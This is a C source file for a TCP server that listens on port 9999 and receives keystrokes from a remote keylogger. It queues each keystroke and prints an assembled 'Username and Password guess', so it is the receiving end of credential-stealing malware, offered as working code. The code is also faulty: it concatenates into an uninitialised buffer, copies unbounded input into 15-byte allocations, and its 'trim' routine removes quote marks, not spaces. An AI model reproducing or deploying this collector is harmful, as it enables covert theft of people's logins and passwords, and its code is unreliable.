#include <stdio.h>
#include <errno.h>
#include <sys/socket.h>
#include <resolv.h>
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h> // for open
#include <unistd.h> // for close

#define MY_PORT   9999
#define MAXBUF    1024

//used for queue
#define TRUE  1
#define FALSE 0

/*
  C implementation of a queue
*/

/* a link in the queue, holds the info and point to the next Node*/
typedef struct {
    char* info;
} DATA;

typedef struct Node_t {
    DATA data;
    struct Node_t *prev;
} NODE;

/* the HEAD of the Queue, hold the amount of node's that are in the queue*/
typedef struct Queue {
    NODE *head;
    NODE *tail;
    int size;
    int limit;
} Queue;

Queue *ConstructQueue(int limit);
void DestructQueue(Queue *queue);
int Enqueue(Queue *pQueue, NODE *item);
NODE *Dequeue(Queue *pQueue);
int isEmpty(Queue* pQueue);

Queue *ConstructQueue(int limit) {
    Queue *queue = (Queue*) malloc(sizeof (Queue));
    if (queue == NULL) {
        return NULL;
    }
    if (limit <= 0) {
        limit = 65535;
    }
    queue->limit = limit;
    queue->size = 0;
    queue->head = NULL;
    queue->tail = NULL;

    return queue;
}

void DestructQueue(Queue *queue) {
    NODE *pN;
    while (!isEmpty(queue)) {
        pN = Dequeue(queue);
        free(pN);
    }
    free(queue);
}

int Enqueue(Queue *pQueue, NODE *item) {
    /* Bad parameter */
    if ((pQueue == NULL) || (item == NULL)) {
        return FALSE;
    }
    // if(pQueue->limit != 0)
    if (pQueue->size >= pQueue->limit) {
        return FALSE;
    }
    /*the queue is empty*/
    item->prev = NULL;
    if (pQueue->size == 0) {
        pQueue->head = item;
        pQueue->tail = item;

    } else {
        /*adding item to the end of the queue*/
        pQueue->tail->prev = item;
        pQueue->tail = item;
    }
    pQueue->size++;
    return TRUE;
}

NODE * Dequeue(Queue *pQueue) {
    /*the queue is empty or bad param*/
    NODE *item;
    if (isEmpty(pQueue))
        return NULL;
    item = pQueue->head;
    pQueue->head = (pQueue->head)->prev;
    pQueue->size--;
    return item;
}

int isEmpty(Queue* pQueue) {
    if (pQueue == NULL) {
        return FALSE;
    }
    if (pQueue->size == 0) {
        return TRUE;
    } else {
        return FALSE;
    }
}



/* removing space */
void trim(char *str)
{
    // To keep track of non-space character count
    int count = 0;
 
    // Traverse the given string. If current character
    // is not space, then place it at index 'count++'
    for (int i = 0; str[i]; i++)
        if (str[i] != '\'')
            str[count++] = str[i]; // here count is
                                   // incremented
    str[count] = '\0';
}



/*
  THE ACTUAL SERVER/MONITOR PROGRAM
*/

int main(int Count, char *Strings[])
{   int sockfd;
  struct sockaddr_in self;
  char buffer[MAXBUF];

  /*USED FOR QUEUING UP THE KEYS*/
  Queue *characters = ConstructQueue(300);
  NODE *node;

  /*---Create streaming socket---*/
    if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 )
  {
    perror("Socket");
    exit(errno);
  }

  /*---Initialize address/port structure---*/
  bzero(&self, sizeof(self));
  self.sin_family = AF_INET;
  self.sin_port = htons(MY_PORT);
  self.sin_addr.s_addr = INADDR_ANY;

  /*---Assign a port number to the socket---*/
    if ( bind(sockfd, (struct sockaddr*)&self, sizeof(self)) != 0 )
  {
    perror("socket--bind");
    exit(errno);
  }

  /*---Make it a "listening socket"---*/
  if ( listen(sockfd, 20) != 0 )
  {
    perror("socket--listen");
    exit(errno);
  }

  /*---Forever... ---*/
  while (1)
  { int clientfd;
    struct sockaddr_in client_addr;
    int addrlen=sizeof(client_addr);

    /*---accept a connection (creating a data pipe)---*/
    clientfd = accept(sockfd, (struct sockaddr*)&client_addr, &addrlen);
    printf("%s:%d connected\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

    //keep on listening for info
    while(1){
      recv(clientfd, buffer, MAXBUF, 0);
      //printf("%s\n", none);
      printf("Recieved keystroke: %s\n", buffer);
      char* s = strstr(buffer, "'");

      if(s == NULL){
        break;
      }
      else{
        //add to queue
        node = (NODE*) malloc(sizeof (NODE));
        node->data.info = malloc(15);
        strcpy(node->data.info, buffer);
        printf("Added to queue: %s\n", node->data.info );
        Enqueue(characters, node);
      }
      memset(buffer,0,strlen(buffer));
    }

    char guess[400];

    printf("Printing out keylogged info...\n");
    while (!isEmpty(characters)) {
        //printf("Inside: ");
        node = Dequeue(characters);
        //printf("%s\n", node->data.info);
        strcat(guess, node->data.info);
        free(node->data.info);
        free(node);
    }
    trim(guess);

    printf("Username and Password guess: %s\n", guess);
    memset(guess,0,strlen(guess));

    /*---Close data connection---*/
    close(clientfd);
  }

  /*---Clean up (should never get here!)---*/
  close(sockfd);
  return 0;
}